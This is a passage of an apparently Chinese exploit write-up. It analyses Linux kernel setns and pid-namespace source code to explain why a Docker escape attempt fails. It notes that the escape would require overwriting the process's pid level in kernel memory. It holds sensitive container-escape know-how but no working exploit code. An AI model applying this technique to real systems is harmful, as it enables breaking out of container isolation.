<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token function" style="color: rgb(215, 58, 73);">SYSCALL_DEFINE2</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> fd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> flags</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">file</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">ns_common</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">ns </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token constant" style="color: rgb(54, 172, 170);">NULL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">nsset</span><span class="token plain"> nsset </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> err </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    err </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">prepare_nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">flags</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 用当前进程的namespace初始化nsset-&gt;nsproxy</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">proc_ns_file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        err </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">validate_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 根据传入的fd更改nsset结构体中的成员</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">else</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">!</span><span class="token plain">err</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token function" style="color: rgb(215, 58, 73);">commit_nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 将当前进程task_struct-&gt;nsproxy指向更改过的nsset-&gt;nsproxy，从而完成对当前进程namespace的切换</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token function" style="color: rgb(215, 58, 73);">perf_event_namespaces</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">current</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">put_nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">out</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">fput</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> err</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">inline</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">validate_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">nsset</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">ns_common</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> ns</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">ops</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token function" style="color: rgb(215, 58, 73);">install</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* 根据fd的不同进入不同的处理分支：mntns_install()，pidns_install()，netns_install()等，这些函数中会对不同的namespace进行更改 */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在 <code>validate_ns(&amp;nsset, ns)</code> 中有一个函数指针的调用，会根据用户态传入的fd不同而进入不同的处理函数。举例，用户态通过 <code>open("/proc/1/ns/pid",0)</code> 获得的fd，调用 <code>setns(fd, 0)</code> 进入内核后，会转到 <code>pidns_install()</code> 的处理流程。mnt对应mntns_install()、net对应netns_install()，其他ns与之类似。</p>
<p>以 pid namespace 为例，我们看看它是如何通过 setns 系统调用进行切换的，<code>pidns_install()</code> 函数处理逻辑如下：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">pidns_install</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">nsset</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">nsset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">ns_common</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">nsproxy</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">nsproxy </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> nsset</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">nsproxy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">pid_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">active </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">task_active_pid_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">current</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">pid_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">ancestor</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">new </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">to_pid_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">!</span><span class="token function" style="color: rgb(215, 58, 73);">ns_capable</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">new</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">user_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> CAP_SYS_ADMIN</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">||</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token operator" style="color: rgb(57, 58, 52);">!</span><span class="token function" style="color: rgb(215, 58, 73);">ns_capable</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">nsset</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">cred</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">user_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> CAP_SYS_ADMIN</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">-</span><span class="token plain">EPERM</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 要求当前进程和目标进程的capabilities都具备CAP_SYS_ADMIN</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">new</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">level </span><span class="token operator" style="color: rgb(57, 58, 52);">&lt;</span><span class="token plain"> active</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">level</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">  </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">-</span><span class="token plain">EINVAL</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// errno 22的原因：不允许子容器切换到父容器的 pid namespace 中</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    nsproxy</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">pid_ns_for_children </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">get_pid_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">new</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 使用目标进程的pid ns替换掉nsset结构体中的pid_ns_for_children</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>通过分析源码可以看到，将Docker进程通过 <code>setns()</code> 加入到 <code>/proc/1/ns/pid</code> 的namespace时，要求目标进程的 task_struct-&gt;thread_pid-&gt;level 的值，不小于当前进程的 level 值。而通过调试发现，Docker中exp进程运行到这里时， <code>new-&gt;level</code> 为0，<code>active-&gt;level</code> 为1，所以直接返回 errno 22——  "Invalid argument"。</p>
<p>因此，如果想让 <code>setns(fd_pid, 0);</code> 返回正常，必须在内核中将当前进程的 <code>current-&gt;thread_pid-&gt;level</code> 改成0。</p>
<p>但是，改完这个值就能切换 pid namespace吗？继续往下看源码发现，即使我们改掉当前进程的level，<code>setns()</code> 系统调用中也只会切换 <code>/proc/$$/ns/pid_ns_for_children</code>，而不是我们需要的 <code>/proc/$$/ns/pid</code>。</p>
<p>所以引出下一个问题：pid namespace 在哪里？</p>
<p><strong>pid namespace 在哪里？</strong></p>
<p>新版本内核中，当前进程的 pid namespace 并不在 <code>task_struct-&gt;nsproxy</code> 指向的 <code>struct nsproxy</code> 结构体中。而是存放在另一个结构体 <code>struct pid</code> 中 ，<code>task_struct-&gt;thread_pid</code> 即指向该结构体。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">pid</span><span class="token plain">   </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">thread_pid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">pid</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">refcount_t</span><span class="token plain"> count</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">   </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// pid namespace计数</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> level</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">   </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 进程所在的 pid namespace 层级</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">spinlock_t</span><span class="token plain"> lock</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* lists of tasks that use this pid */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">hlist_head</span><span class="token plain"> tasks</span><span class="token punctuation" style="color: rgb(57, 58, 52);">[</span><span class="token plain">PIDTYPE_MAX</span><span class="token punctuation" style="color: rgb(57, 58, 52);">]</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">hlist_head</span><span class="token plain"> inodes</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* wait queue for pidfd notifications */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">wait_queue_head_t</span><span class="token plain"> wait_pidfd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">rcu_head</span><span class="token plain"> rcu</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">upid</span><span class="token plain"> numbers</span><span class="token punctuation" style="color: rgb(57, 58, 52);">[</span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">]</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 变长数组，跟count个数对应</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">upid</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> nr</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">      </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 在该namespace中进程的pid值</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">pid_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 对应的namespace</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" 